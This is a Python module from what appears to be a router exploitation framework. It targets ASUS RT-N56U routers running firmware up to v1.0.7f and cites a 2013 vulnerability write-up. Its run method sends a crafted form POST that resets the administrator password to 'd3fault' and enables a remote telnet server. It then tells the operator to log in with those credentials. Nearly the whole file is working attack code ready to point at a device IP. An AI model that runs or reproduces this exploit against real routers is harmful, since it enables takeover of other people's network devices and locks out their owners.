from urllib import urlencode, urlopen
import util
from ..router_vuln import RouterVuln


class rt56u_change_admin(RouterVuln):
    """Change the admin password and enable the remote telnet server
  http://forelsec.blogspot.com/2013/02/asus-rt56u-multiple-vulnerabilities.html
    """
    def __init__(self):
        self.vuln = 'Change Admin Password'
        self.router = 'RT-N56U <= v1.0.7f'
        super(rt56u_change_admin, self).__init__()

    def run(self):
        util.Msg('Changing admin password and enabling remote telnet server...')
        try:
            data = urlencode({'productid':'RT-N56U', 'current_page':'Advanced_System_Content.asp',
                        'next_page':'', 'next_host':'', 'sid_list':'LANHostConfig%3BGeneral%3B',
                        'group_id':'', 'modified':'0', 'action_mode':'+Apply+','first_time':'',
                        'action_script':'','preferred_lang':'EN','wl_ssid2':'wat','firmver':'1.0.7f',
                        'http_passwd':'d3fault','http_passwd2':'d3fault','v_password2':'d3fault',
                        'log_ipaddr':'', 'time_zone':'UCT12', 'ntp_server0':'pool.ntp.org','telnetd':'1'})
            response = urlopen("http://%s/start_apply.htm" % self.ip, data).read()
            if "You cannot Login unless logout another user first" in response:
                util.Msg("Another user is logged in, attempt to logout? [y] ")
            util.Msg('Done.  telnet into %s with \'admin:d3fault\'' % self.ip)
        except Exception, e:
            util.Error('Error: %s' % e)
